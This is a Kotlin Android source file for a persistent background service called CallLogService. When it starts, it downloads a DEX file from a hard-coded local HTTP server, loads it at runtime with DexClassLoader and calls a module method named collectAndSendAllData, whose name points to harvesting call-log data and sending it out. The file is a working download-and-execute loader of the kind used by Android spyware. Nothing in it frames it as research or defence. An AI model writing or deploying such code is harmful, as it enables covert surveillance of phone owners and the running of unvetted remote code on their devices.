package com.example.myapplication.calllogservice

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import dalvik.system.DexClassLoader
import java.io.File
import java.io.FileInputStream
import java.io.FileNotFoundException
import java.io.FileOutputStream
import java.io.IOException
import java.net.HttpURLConnection
import java.net.URL

class CallLogService : Service() {
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            // Используем cacheDir вместо codeCacheDir
            val dexPath = File(cacheDir, "calllogger.dex")
            if (downloadDex(dexPath)) {
                loadAndRunDex(dexPath)
            }
        }.start()
        return START_STICKY
    }

    private fun downloadDex(dexFile: File): Boolean {
        return try {
            // Создаем директорию, если не существует
            dexFile.parentFile?.mkdirs()

            val tempFile = File.createTempFile("temp_dex", ".dex", cacheDir)
            val url = URL("http://192.168.0.101:3000/get-latest-dex")

            url.openStream().use { input ->
                tempFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }

            // Проверяем размер файла
            if (tempFile.length() == 0L) throw IOException("Empty DEX file")

            // Копируем с заменой
            tempFile.copyTo(dexFile, overwrite = true)
            tempFile.delete()

            // Устанавливаем права
            dexFile.setReadable(true, false)
            dexFile.setWritable(false, false)
            true
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    private fun loadAndRunDex(dexFile: File) {
        try {
            if (!dexFile.exists()) throw FileNotFoundException("DEX not found")

            // Используем getCodeCacheDir() для оптимизированного кода
            val optimizedDir = codeCacheDir

            val classLoader = DexClassLoader(
                dexFile.absolutePath,
                optimizedDir.absolutePath,
                null,
                javaClass.classLoader // Используем правильный classLoader
            )

            val clazz = classLoader.loadClass("com.example.dexmodule.CallLoggerModule")
            val method = clazz.getMethod("collectAndSendAllData", Context::class.java)
            method.invoke(clazz.getDeclaredConstructor().newInstance(), this)
        } catch (e: Exception) {
            Log.e("DEX_LOAD", "Error loading module", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}